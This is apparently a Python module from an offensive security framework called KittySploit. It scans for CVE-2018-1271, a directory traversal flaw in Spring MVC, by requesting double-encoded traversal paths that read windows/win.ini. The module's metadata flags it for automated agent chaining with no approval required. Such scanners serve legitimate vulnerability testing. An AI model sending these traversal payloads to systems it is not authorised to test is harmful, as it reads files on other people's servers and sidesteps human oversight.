#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring MVC Framework versions 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring MVC Framework - Local File Inclusion Detection',
        'description': 'Spring MVC Framework versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported are vulnerable to local file inclusion because they allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). A malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'spring', 'lfi', 'traversal', 'vmware', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@knownsec404team/analysis-of-spring-mvc-directory-traversal-vulnerability-cve-2018-1271-b291bdb6be0d',
            'https://pivotal.io/security/cve-2018-1271',
            'https://access.redhat.com/errata/RHSA-2018:1320',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-1271',
            'http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html',
        ],
        'cve': 'CVE-2018-1271',
    }

    def run(self):
        for path in ('/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini', '/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('for 16-bit app support',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='medium',
                    reason="Spring MVC Framework - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

